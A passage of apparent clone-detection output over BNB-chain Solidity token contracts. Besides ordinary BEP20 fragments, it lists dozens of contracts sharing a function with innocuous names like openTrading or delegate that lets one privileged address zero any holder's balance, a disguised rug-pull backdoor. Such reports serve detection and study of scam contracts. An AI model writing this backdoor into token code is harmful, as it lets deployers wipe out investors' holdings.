<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="575" endline="581" pcid="6417">
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
</source>
</class>

<class classid="32" nclones="9" nlines="4" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="596" endline="599" pcid="41">
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="599" endline="602" pcid="8524">
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="589" endline="592" pcid="5822">
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="589" endline="592" pcid="6418">
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="613" endline="616" pcid="7029">
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="596" endline="599" pcid="9115">
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="616" endline="619" pcid="7780">
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="589" endline="592" pcid="7921">
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="584" endline="587" pcid="3704">
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
</source>
</class>

<class classid="33" nclones="461" nlines="5" similarity="100">
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="41" endline="45" pcid="44">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="80" endline="84" pcid="3856">
    function openTrading(address bots) external {
        if(adm == msg.sender && adm != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="40" endline="44" pcid="4233">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="34" endline="38" pcid="8027">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="40" endline="44" pcid="7227">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="39" endline="43" pcid="183">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="39" endline="43" pcid="1378">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="39" endline="43" pcid="867">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="38" endline="42" pcid="8525">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="39" endline="43" pcid="7797">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="39" endline="43" pcid="7967">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="40" endline="44" pcid="723">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="37" endline="41" pcid="2860">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="39" endline="43" pcid="3862">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="80" endline="84" pcid="595">
    function openTrading(address bots) external {
        if(adm == msg.sender && adm != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="36" endline="40" pcid="6297">
    function delegateBot(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="35" endline="39" pcid="7812">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="35" endline="39" pcid="4126">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="39" endline="43" pcid="3479">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="37" endline="41" pcid="511">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="35" endline="39" pcid="5857">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="42" endline="46" pcid="1660">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="36" endline="40" pcid="8544">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="40" endline="44" pcid="5969">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="35" endline="39" pcid="8342">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="39" endline="43" pcid="1363">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="36" endline="40" pcid="5070">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="37" endline="41" pcid="2162">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="35" endline="39" pcid="2337">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="35" endline="39" pcid="5396">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="38" endline="42" pcid="5903">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="37" endline="41" pcid="6419">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="36" endline="40" pcid="8222">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="35" endline="39" pcid="4820">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="35" endline="39" pcid="1013">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="38" endline="42" pcid="6312">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="37" endline="41" pcid="541">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="38" endline="42" pcid="4850">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="39" endline="43" pcid="9354">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="36" endline="40" pcid="1604">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="39" endline="43" pcid="4410">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="36" endline="40" pcid="1154">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="39" endline="43" pcid="1556">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="44" endline="48" pcid="5842">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="35" endline="39" pcid="6013">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="34" endline="38" pcid="4024">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="36" endline="40" pcid="5411">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="37" endline="41" pcid="1777">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="36" endline="40" pcid="1124">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="39" endline="43" pcid="5139">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="39" endline="43" pcid="323">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="36" endline="40" pcid="5823">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="38" endline="42" pcid="9036">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="39" endline="43" pcid="1393">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="83" endline="87" pcid="4919">
    function openTrading(address bots) external {
        if(adm == msg.sender && adm != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="39" endline="43" pcid="4925">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="36" endline="40" pcid="2666">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="39" endline="43" pcid="338">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="36" endline="40" pcid="3464">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="37" endline="41" pcid="5040">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="36" endline="40" pcid="2875">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="36" endline="40" pcid="7782">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="37" endline="41" pcid="3642">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="37" endline="41" pcid="1214">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="40" endline="44" pcid="6786">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="91" endline="95" pcid="2305">
    function openTrading(address bots) external {
        if(adm == msg.sender && adm != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="34" endline="38" pcid="9285">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="36" endline="40" pcid="6028">
    function addLimits(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="40" endline="44" pcid="6494">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="38" endline="42" pcid="5260">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="39" endline="43" pcid="4638">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="41" endline="45" pcid="6192">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="35" endline="39" pcid="7143">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="39" endline="43" pcid="7510">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="35" endline="39" pcid="8685">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="35" endline="39" pcid="7828">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="39" endline="43" pcid="456">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="42" endline="46" pcid="6621">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="35" endline="39" pcid="8477">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="35" endline="39" pcid="7304">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="38" endline="42" pcid="8207">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="38" endline="42" pcid="766">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="41" endline="45" pcid="8462">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="39" endline="43" pcid="1237">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="39" endline="43" pcid="8297">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="42" endline="46" pcid="8161">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="42" endline="46" pcid="6918">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="40" endline="44" pcid="2397">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="39" endline="43" pcid="797">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="41" endline="45" pcid="8282">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="99" endline="103" pcid="3507">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="35" endline="39" pcid="4835">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="36" endline="40" pcid="3449">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="36" endline="40" pcid="8827">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="35" endline="39" pcid="5194">
    function openTrading(address bots) external {
